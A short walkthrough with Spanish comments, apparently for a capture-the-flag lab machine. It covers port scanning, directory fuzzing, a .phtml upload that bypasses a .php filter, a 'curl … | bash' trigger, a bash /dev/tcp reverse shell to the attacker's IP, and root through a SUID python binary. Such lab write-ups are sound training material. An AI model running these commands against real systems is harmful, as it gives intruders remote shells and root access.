
```bash
#!/bin/bash
ping -c 1 10.10.234.141 #Hacemos un ping para ver si existe conectividad
nmap -p- --open -sS -sV --min-rate 2500 -n -vvv -Pn 10.10.234.141 -oN escaneo 
#Vemos los puertos 20 y 80 abiertos y procedemos a hacer fuzzing web con gobuster para ver los directorios de esta
gobuster dir -u http://10.10.234.141/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
#Encontramos multiples directorios
#Creamos una reverse shell en .phtml ya que no deja usar el .php
#Una vez creada la ejecutamos para ver si funciona y acto seguido creamos el archivo index.html
python3 -m http.server 80
nc -nlvp 443
#Y en el buscador http://10.10.234.141/uploads/pwned.phtmlcmd=curl 10.9.142.44 | bash obteniendo asi la reverse shell
ls /
cd /home/rootme
find / -perm -u=s -type f 2>/dev/null #vemos los archivos que se pueden ejecutar sin ser root a continuacion creamos el archivo hackeo.py
python3 -m http.server 80 #Volvemos a abrir el servidor
wget 10.9.142.44/hackeo.py #Descargamos el archivo en la maquina
python hackeo.py #Ejecutamos el script y seremos root
script /dev/null -c bash #Para obtener un promt
```

index.html
```bash
#!/bin/bash
sh -i >& /dev/tcp/10.9.142.44/443 0>&1
```

hackeo.py
```python
import os

os.setuid(0)
os.system('bash')
```


